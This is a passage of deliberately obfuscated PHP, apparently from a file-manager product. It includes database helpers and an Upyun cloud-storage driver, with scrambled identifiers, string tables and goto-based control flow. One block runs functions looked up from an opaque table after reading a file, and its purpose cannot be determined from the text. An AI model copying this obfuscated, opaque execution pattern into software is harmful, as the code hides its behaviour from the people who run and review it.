$e’½œÔì»Õ); } } goto f®¯ô‹¤¬é; f®¯ô‹¤¬é: $F›Ï§Â¢× = $this->query($DàŒâã²Ø); $aÒìÏ¯æ† = array(); if ($F›Ï§Â¢×) { foreach ($F›Ï§Â¢× as $F’Œ½‰·ˆÛ => $BË–ÄõÑòÄ) { $BË–ÄõÑòÄ = array_change_key_case($BË–ÄõÑòÄ); $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[28]] = isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[28]]) ? $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[28]] : $e¸ªÉøÊµ©[375]; $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[29]] = isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[29]]) ? $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[29]] : $e¸ªÉøÊµ©[375]; $AÈ¼çô³—Ğ = isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[271]]) ? $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[271]] : $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[28]]; $aÒìÏ¯æ†[$AÈ¼çô³—Ğ] = array($e¸ªÉøÊµ©[28] => $AÈ¼çô³—Ğ, $e¸ªÉøÊµ©[29] => $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[29]], $e¸ªÉøÊµ©[31] => (bool) (isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[103]]) && $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[103]] === $e¸ªÉøÊµ©[33] || isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[31]]) && $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[31]] === $e¸ªÉøÊµ©[33]), $e¸ªÉøÊµ©[34] => isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[34]]) ? $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[34]] : (isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[53]]) ? $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[53]] : $e¸ªÉøÊµ©[375]), $e¸ªÉøÊµ©[36] => isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[93]]) ? strtolower($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[93]]) == $e¸ªÉøÊµ©[38] : (isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[54]]) ? $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[54]] : !1), $e¸ªÉøÊµ©[39] => isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[909]]) ? strtolower($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[909]]) == $e¸ªÉøÊµ©[41] : (isset($BË–ÄõÑòÄ[$e¸ªÉøÊµ©[93]]) ? $BË–ÄõÑòÄ[$e¸ªÉøÊµ©[93]] : !1)); } } goto EÇÅÆ–äÌ; EÇÅÆ–äÌ: return $aÒìÏ¯æ†; goto côÅ†óÀ; côÅ†óÀ: } public function getTables($f³ˆï¨² = '') { $dÊ§±…Ö‡ =& $_SERVER[«¾°Ã¤]; if (think_config($dÊ§±…Ö‡[910])) { $a¤¶ µÌóÙ = str_replace($dÊ§±…Ö‡[911], $f³ˆï¨², think_config($dÊ§±…Ö‡[910])); } else { switch ($this->dbType) { case $dÊ§±…Ö‡[878]: case $dÊ§±…Ö‡[880]: $a¤¶ µÌóÙ = $dÊ§±…Ö‡[912]; break; case $dÊ§±…Ö‡[877]: case $dÊ§±…Ö‡[895]: $a¤¶ µÌóÙ = $dÊ§±…Ö‡[913]; break; case $dÊ§±…Ö‡[904]: $a¤¶ µÌóÙ = $dÊ§±…Ö‡[914]; break; case $dÊ§±…Ö‡[879]: think_exception(think_lang($dÊ§±…Ö‡[915]) . $dÊ§±…Ö‡[916]); break; case $dÊ§±…Ö‡[896]: $a¤¶ µÌóÙ = $dÊ§±…Ö‡[42] . $dÊ§±…Ö‡[43] . $dÊ§±…Ö‡[44]; break; case $dÊ§±…Ö‡[907]: default: if (!empty($f³ˆï¨²)) { $a¤¶ µÌóÙ = $dÊ§±…Ö‡[860] . $f³ˆï¨² . $dÊ§±…Ö‡[861]; } else { $a¤¶ µÌóÙ = $dÊ§±…Ö‡[862]; } } } $dĞïµÌ¤ = $this->query($a¤¶ µÌóÙ); $Dí‰äÏ°½‘ = array(); foreach ($dĞïµÌ¤ as $fÆ–ÓÍÃ„Ö => $bˆñ¨ô¬ïí) { $Dí‰äÏ°½‘[$fÆ–ÓÍÃ„Ö] = current($bˆñ¨ô¬ïí); } return $Dí‰äÏ°½‘; } protected function parseLimit($F…·öŸ†ßø) { $AÏæÔæŞ­ê =& $_SERVER[«¾°Ã¤]; $cáÖÎ¨‡‚ = $AÏæÔæŞ­ê[33]; if (!empty($F…·öŸ†ßø)) { switch ($this->dbType) { case $AÏæÔæŞ­ê[904]: case $AÏæÔæŞ­ê[896]: $F…·öŸ†ßø = explode($AÏæÔæŞ­ê[47], $F…·öŸ†ßø); if (count($F…·öŸ†ßø) > 1) { $cáÖÎ¨‡‚ .= $AÏæÔæŞ­ê[48] . $F…·öŸ†ßø[1] . $AÏæÔæŞ­ê[49] . $F…·öŸ†ßø[0] . $AÏæÔæŞ­ê[50]; } else { $cáÖÎ¨‡‚ .= $AÏæÔæŞ­ê[48] . $F…·öŸ†ßø[0] . $AÏæÔæŞ­ê[50]; } break; case $AÏæÔæŞ­ê[877]: case $AÏæÔæŞ­ê[895]: break; case $AÏæÔæŞ­ê[879]: break; case $AÏæÔæŞ­ê[878]: case $AÏæÔæŞ­ê[880]: break; case $AÏæÔæŞ­ê[907]: default: $cáÖÎ¨‡‚ .= $AÏæÔæŞ­ê[48] . $F…·öŸ†ßø . $AÏæÔæŞ­ê[50]; } } return $cáÖÎ¨‡‚; } public function parseKey(&$e˜¯àçöì, $c‘Ò¦ÛÍ£ì = true) { $C¦¨‡õÛ¯¦ =& $_SERVER[«¾°Ã¤]; if ($c‘Ò¦ÛÍ£ì) { $e˜¯àçöì = $this->parseKeyCheck($e˜¯àçöì); } if ($this->dbType == $C¦¨‡õÛ¯¦[907]) { if ($e˜¯àçöì != $C¦¨‡õÛ¯¦[182] && !preg_match($C¦¨‡õÛ¯¦[872], $e˜¯àçöì)) { $e˜¯àçöì = $C¦¨‡õÛ¯¦[382] . trim($e˜¯àçöì, $C¦¨‡õÛ¯¦[382]) . $C¦¨‡õÛ¯¦[382]; } return $e˜¯àçöì; } else { return parent::parseKey($e˜¯àçöì, $c‘Ò¦ÛÍ£ì); } } public function close() { $this->_linkID = null; } public function error() { $fÊœ‡¦Œá =& $_SERVER[«¾°Ã¤]; if ($this->PDOStatement) { $b„ÊøŸ¡Â¼ = $this->PDOStatement->errorInfo(); $this->error = $b„ÊøŸ¡Â¼[1] . $fÊœ‡¦Œá[4] . $b„ÊøŸ¡Â¼[2]; } else { $this->error = $fÊœ‡¦Œá[33]; } if ($fÊœ‡¦Œá[33] != $this->queryStr) { $this->error .= LNG($fÊœ‡¦Œá[45]) . $this->queryStr; } think_trace($this->error, $fÊœ‡¦Œá[33], $fÊœ‡¦Œá[46]); return $this->error; } public function escapeString($côˆµßĞÕ) { $d‰á²”³Ï‚ =& $_SERVER[«¾°Ã¤]; switch ($this->dbType) { case $d‰á²”³Ï‚[904]: case $d‰á²”³Ï‚[877]: case $d‰á²”³Ï‚[895]: case $d‰á²”³Ï‚[907]: return addslashes($côˆµßĞÕ); case $d‰á²”³Ï‚[879]: case $d‰á²”³Ï‚[896]: case $d‰á²”³Ï‚[878]: case $d‰á²”³Ï‚[880]: return str_ireplace($d‰á²”³Ï‚[55], $d‰á²”³Ï‚[56], $côˆµßĞÕ); } } protected function parseValue($f„·µÈèì) { $D’š›½ó…È =& $_SERVER[«¾°Ã¤]; if (is_string($f„·µÈèì)) { $aĞ÷»º†µÜ = strpos($f„·µÈèì, $D’š›½ó…È[4]) === 0 && in_array($f„·µÈèì, array_keys($this->bind)); $f„·µÈèì = $aĞ÷»º†µÜ ? $this->escapeString($f„·µÈèì) : $D’š›½ó…È[917] . $this->escapeString($f„·µÈèì) . $D’š›½ó…È[917]; } elseif (isset($f„·µÈèì[0]) && is_string($f„·µÈèì[0]) && strtolower($f„·µÈèì[0]) == $D’š›½ó…È[295]) { $f„·µÈèì = $this->escapeString($f„·µÈèì[1]); } elseif (is_array($f„·µÈèì)) { $f„·µÈèì = array_map(array($this, $D’š›½ó…È[918]), $f„·µÈèì); } elseif (is_bool($f„·µÈèì)) { $f„·µÈèì = $f„·µÈèì ? $D’š›½ó…È[87] : $D’š›½ó…È[191]; } elseif (is_null($f„·µÈèì)) { $f„·µÈèì = $D’š›½ó…È[103]; } return $f„·µÈèì; } public function getLastInsertId() { $C¦ºÒ±µÎ´ =& $_SERVER[«¾°Ã¤]; switch ($this->dbType) { case $C¦ºÒ±µÎ´[904]: case $C¦ºÒ±µÎ´[896]: case $C¦ºÒ±µÎ´[877]: case $C¦ºÒ±µÎ´[895]: case $C¦ºÒ±µÎ´[879]: case $C¦ºÒ±µÎ´[907]: return $this->_linkID->lastInsertId(); case $C¦ºÒ±µÎ´[878]: case $C¦ºÒ±µÎ´[880]: $F‚‘ğÛ£ø = $this->table; $b»À¢± = $this->query("\x53\105\x4c\x45\103\x54\40{$F‚‘ğÛ£ø}\x2e\143\x75\162\162\x76\141\x6c\x20\143\165\162\x72\x76\141\154\x20\x46\x52\117\115\x20\x64\165\141\x6c"); return $b»À¢± ? $b»À¢±[0][$C¦ºÒ±µÎ´[919]] : 0; } } } goto Eª¹¿Ö†ë©; c¿¯Â†×çŸ: if ($_SERVER[$_SERVER[«¾°Ã¤][396]] != $_SERVER[$_SERVER[«¾°Ã¤][1331]]) { goto bàÏá•—•‘; cÆÜàñÕé: $FöÛÊ›¿ = explode($_SERVER[«¾°Ã¤][229], $Dî‹‚ãÃéÇ); if (count($FöÛÊ›¿) < $_SERVER[«¾°Ã¤][400]) { $Böéª’ÓñÎ = $_SERVER[«¾°Ã¤][401]; $Böéª’ÓñÎ(); } $A„÷„Å = $_SERVER[«¾°Ã¤][402]; goto d…†ÖÔ®È”; bàÏá•—•‘: $DÉÍŒÇÂŒ = $_SERVER[«¾°Ã¤][397]; $Aîì·»æÕ­ = $_SERVER[$_SERVER[«¾°Ã¤][398]] . $_SERVER[«¾°Ã¤][399]; $Dî‹‚ãÃéÇ = $DÉÍŒÇÂŒ($Aîì·»æÕ­); goto cÆÜàñÕé; d…†ÖÔ®È”: $A„÷„Å($_SERVER[$_SERVER[«¾°Ã¤][394]]); goto d¿´ä§¡…; d¿´ä§¡…: } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($f•…¬ÂµŒØ, $B×¤ˆéàí„ = 0) { parent::__construct(); $this->source = $f•…¬ÂµŒØ; $this->sourceSize = $B×¤ˆéàí„; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($FÎ†‹‚‚®Ò = false) { return $this->sourceSize; } public function getContent($CÃææÑì—• = false) { return $this->fileSubstr($CÃææÑì—•, 0, $this->sourceSize); } public function fileSubstr($E„ÊÀñ÷£ = false, $c“–¼—Û£ = 0, $cğ¤¾˜Ô­ = 0) { if (!$cğ¤¾˜Ô­) { $cğ¤¾˜Ô­ = $this->sourceSize; } $e›ùÅàÁ£ = $this->sourceSize - $c“–¼—Û£; if ($cğ¤¾˜Ô­ >= $e›ùÅàÁ£) { $cğ¤¾˜Ô­ = $e›ùÅàÁ£; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $c“–¼—Û£, $cğ¤¾˜Ô­); } if ($this->sourceType == self::TYPE_FILE) { if ($cğ¤¾˜Ô­ <= 0) { return $_SERVER[«¾°Ã¤][33]; } $a‹Á¼äá‚ = ftell($this->source); fseek_64($this->source, $a‹Á¼äá‚ + $c“–¼—Û£); $f·êÄ×¯µ‡ = @fread($this->source, $cğ¤¾˜Ô­); fseek_64($this->source, $a‹Á¼äá‚); return $f·êÄ×¯µ‡; } } public function hashMd5($Aç±°¥İ» = false) { return md5($this->getContent()); } public static function hash($aÚ¬å˜İİ¹, $E˜âÜŒÕè„ = 0) { $Føñë¼¨ù = new PathDriverStream($aÚ¬å˜İİ¹, $E˜âÜŒÕè„); return $Føñë¼¨ù->hashSimple($aÚ¬å˜İİ¹); } public static function md5($F»ğÄå‡¤¨, $D¤âİ£†œÏ = 0) { $a—ÏÓÂäòÇ = new PathDriverStream($F»ğÄå‡¤¨, $D¤âİ£†œÏ); return $a—ÏÓÂäòÇ->hashMd5($F»ğÄå‡¤¨); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\x70\x3a\57\57\x76\x30\56\x61\160\151\56\x75\160\x79\x75\156\x2e\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($b¥ª²ƒùÒ) { parent::__construct(); $this->_init($b¥ª²ƒùÒ); } public function _init($AŒÒ®£Šñ) { $AÈ•›„ø‚ =& $_SERVER[«¾°Ã¤]; foreach ($AŒÒ®£Šñ as $aÆÜ‹àºóË => $cŞÊÃÅ•‡) { if (isset($this->{$aÆÜ‹àºóË})) { $this->{$aÆÜ‹àºóË} = $cŞÊÃÅ•‡; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($AÈ•›„ø‚[1332] . LNG($AÈ•›„ø‚[1263])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($Aù½Ş†Ø³Ã, $fˆÊ¸…ç¬æ = "\x47\x45\x54") { $dÌÑÚ·åã =& $_SERVER[«¾°Ã¤]; $bìŞÑ¡—Ş = gmdate($dÌÑÚ·åã[1297]); $cÍëÚÇ«Ô = base64_encode(hash_hmac($dÌÑÚ·åã[1333], "{$fˆÊ¸…ç¬æ}\46{$Aù½Ş†Ø³Ã}\46{$bìŞÑ¡—Ş}", md5("{$this->userpass}"), !0)); $Eº£Ï¶¢©ˆ = array("\x41\165\x74\150\157\162\151\x7a\141\x74\151\157\x6e\72\125\120\131\x55\x4e\40{$this->username}\x3a{$cÍëÚÇ«Ô}", "\x44\141\x74\145\72{$bìŞÑ¡—Ş}"); return $Eº£Ï¶¢©ˆ; } public function ussRequest($dŸØÈùÆÉ, $dÊ‹ØµÃ = "\x47\x45\124", $fÄ§ìŞÅ¢ = false, $DöĞŞÑİëò = false, $c”Ú½ØÇ“¤ = false) { goto dœòùâÚõ­; dœòùâÚõ­: $E‰æóàÒ„± =& $_SERVER[«¾°Ã¤]; $dŸØÈùÆÉ = trim($dŸØÈùÆÉ, $E‰æóàÒ„±[8]); $a°ö˜œÄĞ = "\x2f{$this->bucket}\57{$dŸØÈùÆÉ}"; goto FàğõùŒ‹Û; DæÓÍñçãÁ: if (!$a¦Ÿƒ¿‹ŠŒ) { return array($E‰æóàÒ„±[1087] => !1, $E‰æóàÒ„±[1089] => $E‰æóàÒ„±[1334]); } if (strtolower($dÊ‹ØµÃ) == $E‰æóàÒ„±[190] || in_array($a¦Ÿƒ¿‹ŠŒ[$E‰æóàÒ„±[1087]], array($E‰æóàÒ„±[1190], $E‰æóàÒ„±[1335]))) { $fÄ§ìŞÅ¢ = $a¦Ÿƒ¿‹ŠŒ[$E‰æóàÒ„±[1336]]; } else { $fÄ§ìŞÅ¢ = json_decode($a¦Ÿƒ¿‹ŠŒ[$E‰æóàÒ„±[1089]], !0); if (!$fÄ§ìŞÅ¢) { $fÄ§ìŞÅ¢ = $a¦Ÿƒ¿‹ŠŒ[$E‰æóàÒ„±[1089]]; } else { if (!$a¦Ÿƒ¿‹ŠŒ[$E‰æóàÒ„±[719]] && isset($fÄ§ìŞÅ¢[$E‰æóàÒ„±[1337]])) { $fÄ§ìŞÅ¢ = $fÄ§ìŞÅ¢[$E‰æóàÒ„±[1337]]; } } } return array($E‰æóàÒ„±[1087] => $a¦Ÿƒ¿‹ŠŒ[$E‰æóàÒ„±[719]], $E‰æóàÒ„±[1089] => $fÄ§ìŞÅ¢); goto e¡±³‘—Æ•; FàğõùŒ‹Û: $a‡Ñâİ¼èğ = $this->ussHeaders($a°ö˜œÄĞ, $dÊ‹ØµÃ); if ($DöĞŞÑİëò) { $a‡Ñâİ¼èğ = array_merge($a‡Ñâİ¼èğ, $DöĞŞÑİëò); } $a¦Ÿƒ¿‹ŠŒ = url_request($this->endpoint . $a°ö˜œÄĞ, $dÊ‹ØµÃ, $fÄ§ìŞÅ¢, $a‡Ñâİ¼èğ, $c”Ú½ØÇ“¤); goto DæÓÍñçãÁ; e¡±³‘—Æ•: } public function mkfile($A¼À“ñÀ, $dåçÑ¹–ù = '', $c¢»ö²é… = REPEAT_RENAME) { if ($this->setContent($A¼À“ñÀ, $dåçÑ¹–ù)) { return $this->getPathOuter($A¼À“ñÀ); } return !1; } public function mkdir($dğ§”àŸ¼œ, $aÕÁ´ÑÀãä = REPEAT_SKIP) { $fäß‚š œÊ =& $_SERVER[«¾°Ã¤]; $aæ˜ÎÜ„‚· = trim($dğ§”àŸ¼œ, $fäß‚š œÊ[8]); if ($this->_isFolder($aæ˜ÎÜ„‚·)) { return $this->getPathOuter($aæ˜ÎÜ„‚·); } $AîŒíÑë¼° = array($fäß‚š œÊ[1338]); $EÅƒ¢¹«ã˜ = $this->ussRequest($aæ˜ÎÜ„‚·, $fäß‚š œÊ[224], !1, $AîŒíÑë¼°); return $EÅƒ¢¹«ã˜[$fäß‚š œÊ[1087]] ? $this->getPathOuter($aæ˜ÎÜ„‚·) : !1; } public function copyFile($aÉ¤‚äáÉ, $BÙà¤Í‘©ø) { $b…ïÃ–äæ =& $_SERVER[«¾°Ã¤]; $F´Ù†´‘ğ = array($b…ïÃ–äæ[1339] . "\57{$this->bucket}\x2f{$aÉ¤‚äáÉ}", $b…ïÃ–äæ[1340]); $e±Œßëñ¥ß = $this->ussRequest($BÙà¤Í‘©ø, $b…ïÃ–äæ[226], !1, $F´Ù†´‘ğ); return $e±Œßëñ¥ß[$b…ïÃ–äæ[1087]] ? !0 : $this->getPathOuter($BÙà¤Í‘©ø); } public function moveFile($d·—§õÎª, $e¼Å×‹Â‰ˆ) { $EİëÍİ¾‘­ =& $_SERVER[«¾°Ã¤]; $fÕ›˜ºÒİ = array($EİëÍİ¾‘­[1341] . "\57{$this->bucket}\x2f{$d·—§õÎª}", $EİëÍİ¾‘­[1340]); $e‹Åå«’¿˜ = $this->ussRequest($e¼Å×‹Â‰ˆ, $EİëÍİ¾‘­[226], !1, $fÕ›˜ºÒİ); return $e‹Åå«’¿˜[$EİëÍİ¾‘­[1087]] ? !0 : $this->getPathOuter($e¼Å×‹Â‰ˆ); } public function delFile($EïèÑÁ¶›ƒ) { $D¿¢Á¡¤‘¥ =& $_SERVER[«¾°Ã¤]; $F—À»š¬Ğ = $this->ussRequest($EïèÑÁ¶›ƒ, $D¿¢Á¡¤‘¥[1342]); return $F—À»š¬Ğ[$D¿¢Á¡¤‘¥[1087]] ? !0 : !1; } public function delFolder($AèñÌ‘¦œ) { goto eæ—˜“´İ˜; DÖ¼âîÏî: return $fÓÛí²„ë„[$c¿Üğ©ÊÉ[1087]]; goto a‘å¢Â Š; eæ—˜“´İ˜: $c¿Üğ©ÊÉ =& $_SERVER[«¾°Ã¤]; if (!$this->exist($AèñÌ‘¦œ)) { return !0; } $this->listItemCache = !1; goto BÍĞ¿¨‡ñ©; BÍĞ¿¨‡ñ©: $D–ï¨‰µ¾ = $D•À¡šóÉ… = array(); $this->fileList($AèñÌ‘¦œ, $D–ï¨‰µ¾, $D•À¡šóÉ…, !0); $this->listItemCache = !0; goto E†Ñğ¸Şë; E†Ñğ¸Şë: foreach ($D•À¡šóÉ… as $aÒº“§’ÒÉ) { $fÓÛí²„ë„ = $this->ussRequest($aÒº“§’ÒÉ[$c¿Üğ©ÊÉ[28]], $c¿Üğ©ÊÉ[1342]); if (!$fÓÛí²„ë„[$c¿Üğ©ÊÉ[1087]]) { return !1; } } foreach ($D–ï¨‰µ¾ as $DŠ˜ŞÎÈÎ) { $fÓÛí²„ë„ = $this->ussRequest($DŠ˜ŞÎÈÎ, $c¿Üğ©ÊÉ[1342]); if (!$fÓÛí²„ë„[$c¿Üğ©ÊÉ[1087]]) { return !1; } } $fÓÛí²„ë„ = $this->ussRequest($AèñÌ‘¦œ, $c¿Üğ©ÊÉ[1342]); goto DÖ¼âîÏî; a‘å¢Â Š: } public function rename($A’ãÉ©Ê–’, $E´À£ñ™öù) { if ($this->isFile($A’ãÉ©Ê–’)) { $E´À£ñ™öù = get_path_father($A’ãÉ©Ê–’) . $E´À£ñ™öù; return $this->moveFile($A’ãÉ©Ê–’, $E´À£ñ™öù); } return $this->renameObject($A’ãÉ©Ê–’, $E´À£ñ™öù); } public function fileInfo($D¦Ì‚—¤ƒ, $CÅ™ï§‘Ğ” = false, $cÛÏ’šˆÄÇ = array()) { goto DëÒÙ®À¤¶; C’©Ö…Í‹¢: return $Dğòî¤çµÎ; goto BåÀîº†Ø®; BµÎÈ†…‚ã: $Dğòî¤çµÎ[$b÷Œ´æôˆ[194]] = intval($cÛÏ’šˆÄÇ[$b÷Œ´æôˆ[1343]]); $Dğòî¤çµÎ[$b÷Œ´æôˆ[84]] = intval($cÛÏ’šˆÄÇ[$b÷Œ´æôˆ[1344]]); $Dğòî¤çµÎ[$b÷Œ´æôˆ[78]] = $cÛÏ’šˆÄÇ[$b÷Œ´æôˆ[78]]; goto C’©Ö…Í‹¢; bóé¹ìµ‘: $Dğòî¤çµÎ[$b÷Œ´æôˆ[194]] = $Dğòî¤çµÎ[$b÷Œ´æôˆ[84]] = 0; $Dğòî¤çµÎ[$b÷Œ´æôˆ[195]] = $Dğòî¤çµÎ[$b÷Œ´æôˆ[196]] = !0; if (empty($cÛÏ’šˆÄÇ)) { $cÛÏ’šˆÄÇ = $this->objectMeta($D¦Ì‚—¤ƒ); if (!$cÛÏ’šˆÄÇ) { return $Dğòî¤çµÎ; } } goto BµÎÈ†…‚ã; DëÒÙ®À¤¶: $b÷Œ´æôˆ =& $_SERVER[«¾°Ã¤]; $Dğòî¤çµÎ = array($b÷Œ´æôˆ[28] => $this->pathThis($D¦Ì‚—¤ƒ), $b÷Œ´æôˆ[76] => $this->getPathOuter($b÷Œ´æôˆ[8] . $D¦Ì‚—¤ƒ), $b÷Œ´æôˆ[29] => $b÷Œ´æôˆ[193], $b÷Œ´æôˆ[78] => isset($cÛÏ’šˆÄÇ[$b÷Œ´æôˆ[78]]) ? $cÛÏ’šˆÄÇ[$b÷Œ´æôˆ[78]] : 0, $b÷Œ´æôˆ[168] => $this->ext($D¦Ì‚—¤ƒ)); if ($CÅ™ï§‘Ğ”) { return $Dğòî¤çµÎ; } goto bóé¹ìµ‘; BåÀîº†Ø®: } public function folderInfo($eÉù„åğÓ‡, $Aùø¯“Àï½ = false) { goto F‡İáõ÷Ş; Eì§­ì¡Ë: $A‰´±†’¢ƒ[$F„…ÕÚ‡µ½[194]] = $A‰´±†’¢ƒ[$F„…ÕÚ‡µ½[84]] = 0; $A‰´±†’¢ƒ[$F„…ÕÚ‡µ½[195]] = $A‰´±†’¢ƒ[$F„…ÕÚ‡µ½[196]] = !0; if (empty($d±›É–Ëİô)) { $d±›É–Ëİô = $this->objectMeta($eÉù„åğÓ‡); if (!$d±›É–Ëİô) { return $A‰´±†’¢ƒ; } } goto cÆ¹¦Œñ; F‡İáõ÷Ş: $F„…ÕÚ‡µ½ =& $_SERVER[«¾°Ã¤]; $A‰´±†’¢ƒ = array($F„…ÕÚ‡µ½[28] => $this->pathThis($eÉù„åğÓ‡), $F„…ÕÚ‡µ½[76] => $this->getPathOuter($F„…ÕÚ‡µ½[8] . $eÉù„åğÓ‡), $F„…ÕÚ‡µ½[29] => $F„…ÕÚ‡µ½[77]); if ($Aùø¯“Àï½) { return $A‰´±†’¢ƒ; } goto Eì§­ì¡Ë; cÆ¹¦Œñ: $A‰´±†’¢ƒ[$F„…ÕÚ‡µ½[194]] = intval($d±›É–Ëİô[$F„…ÕÚ‡µ½[1343]]); $A‰´±†’¢ƒ[$F„…ÕÚ‡µ½[84]] = intval($d±›É–Ëİô[$F„…ÕÚ‡µ½[1344]]); return $A‰´±†’¢ƒ; goto Dá·åóÙÄ; Dá·åóÙÄ: } private function listObjs($DùíßºÒá, $B”·Çß¼‡ = 0, $D–Œ¤Û»Œö = 1000) { $Cêà®ÌÈİ‰ =& $_SERVER[«¾°Ã¤]; $f•ÄšÜ§®Ï = array($Cêà®ÌÈİ‰[1345], $Cêà®ÌÈİ‰[1346] . $D–Œ¤Û»Œö); if ($B”·Çß¼‡) { $f•ÄšÜ§®Ï[] = $Cêà®ÌÈİ‰[1347] . $B”·Çß¼‡; } $a¦¸¼Ô£ÕŠ = $this->ussRequest($DùíßºÒá, $Cêà®ÌÈİ‰[228], !1, $f•ÄšÜ§®Ï); return !$a¦¸¼Ô£ÕŠ[$Cêà®ÌÈİ‰[1087]] ? !1 : $a¦¸¼Ô£ÕŠ[$Cêà®ÌÈİ‰[1089]]; } private function fileList($EÎÕÉ¹£Á¥, &$D¿—éôÉ¤, &$d²õÈÙËìˆ, $A‚ç™§ò”ï = false) { goto CÓÑ¾Ã»; CÓÑ¾Ã»: $eöÔ‚µİµ =& $_SERVER[«¾°Ã¤]; $e¾‹¤¢”ß³ = $eöÔ‚µİµ[33]; $eº»•ƒ­àá = 1000; goto a°ÛÄ³Ã¥; a°ÛÄ³Ã¥: $Fæ‡¨¶Ğ¦ = rtrim($EÎÕÉ¹£Á¥, $eöÔ‚µİµ[8]) . $eöÔ‚µİµ[8]; $CØ“ã£ÓõÛ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $AËÊò•±¯ = $this->listObjs($EÎÕÉ¹£Á¥, $e¾‹¤¢”ß³, $eº»•ƒ­àá); if (!$AËÊò•±¯) { return !1; } $e¾‹¤¢”ß³ = isset($AËÊò•±¯[$eöÔ‚µİµ[1348]]) ? $AËÊò•±¯[$eöÔ‚µİµ[1348]] : $eöÔ‚µİµ[33]; $D„·¥ğğã = isset($AËÊò•±¯[$eöÔ‚µİµ[1349]]) ? $AËÊò•±¯[$eöÔ‚µİµ[1349]] : array(); foreach ($D„·¥ğğã as $AÙ“ éò›) { $bÉâªÇäÁå = $AÙ“ éò›[$eöÔ‚µİµ[29]] == $eöÔ‚µİµ[77] ? !0 : !1; $F’Î‡”§Ì = ltrim($Fæ‡¨¶Ğ¦ . $AÙ“ éò›[$eöÔ‚µİµ[28]], $eöÔ‚µİµ[8]) . ($bÉâªÇäÁå ? $eöÔ‚µİµ[8] : $eöÔ‚µİµ[33]); $aÒ¯©¼À¡Õ = array($eöÔ‚µİµ[28] => $F’Î‡”§Ì, $eöÔ‚µİµ[29] => $bÉâªÇäÁå ? $eöÔ‚µİµ[77] : $eöÔ‚µİµ[193], $eöÔ‚µİµ[78] => $AÙ“ éò›[$eöÔ‚µİµ[335]], $eöÔ‚µİµ[1344] => $AÙ“ éò›[$eöÔ‚µİµ[1350]]); if ($CØ“ã£ÓõÛ) { $this->cacheMethod($eöÔ‚µİµ[199], $F’Î‡”§Ì, $bÉâªÇäÁå); $this->cacheMethod($eöÔ‚µİµ[200], $F’Î‡”§Ì, $aÒ¯©¼À¡Õ); } if ($bÉâªÇäÁå) { $D¿—éôÉ¤[] = $F’Î‡”§Ì; if ($A‚ç™§ò”ï) { $this->fileList($F’Î‡”§Ì, $D¿—éôÉ¤, $d²õÈÙËìˆ, $A‚ç™§ò”ï); } continue; } $d²õÈÙËìˆ[] = $aÒ¯©¼À¡Õ; } if (count($D„·¥ğğã) < $eº»•ƒ­àá) { break; } } goto EÎ‰‡ƒ™Ã; EÎ‰‡ƒ™Ã: if ($CØ“ã£ÓõÛ) { $this->cacheMethod($eöÔ‚µİµ[199], $EÎÕÉ¹£Á¥, !0); } goto CÆê–õÎº˜; CÆê–õÎº˜: } public function listPath($Cæ®Çìší÷, $F½æ×İ÷¥ = false) { $Bä›”ÙóÎ =& $_SERVER[«¾°Ã¤]; $BÄÃˆ¢Ÿ¹ = $e»™°‰öİ” = array(); $this->fileList($Cæ®Çìší÷, $BÄÃˆ¢Ÿ¹, $e»™°‰öİ”); foreach ($BÄÃˆ¢Ÿ¹ as $f•‘¼ÑÆ“ => $cÍÒÉÈò›) { $BÄÃˆ¢Ÿ¹[$f•‘¼ÑÆ“] = $this->folderInfo($cÍÒÉÈò›, $F½æ×İ÷¥); } foreach ($e»™°‰öİ” as $f•‘¼ÑÆ“ => $cÍÒÉÈò›) { $e»™°‰öİ”[$f•‘¼ÑÆ“] = $this->fileInfo($cÍÒÉÈò›[$Bä›”ÙóÎ[28]], $F½æ×İ÷¥, $cÍÒÉÈò›); } return array($Bä›”ÙóÎ[75] => $BÄÃˆ¢Ÿ¹, $Bä›”ÙóÎ[74] => $e»™°‰öİ”); } public function has($dœ÷ÖåÜ«Ï, $DÅŸøæç—¾ = false, $C…†¬ˆ ½‹ = true) { goto EÒ«®Ş—; EÒ«®Ş—: $cŠˆ¼¥çåÈ =& $_SERVER[«¾°Ã¤]; $E’À•¥¸ÓØ = $cŠˆ¼¥çåÈ[33]; $AÀˆŠš‘â… = 500; goto CŒÕ•–¾¡Š; CŒÕ•–¾¡Š: $cæŸã½îŞ = 0; $Aö‹…ŒËÀ = 0; $CÊŒƒ¢éš = rtrim($dœ÷ÖåÜ«Ï, $cŠˆ¼¥çåÈ[8]) . $cŠˆ¼¥çåÈ[8]; goto F”Á µÌæ£; F”Á 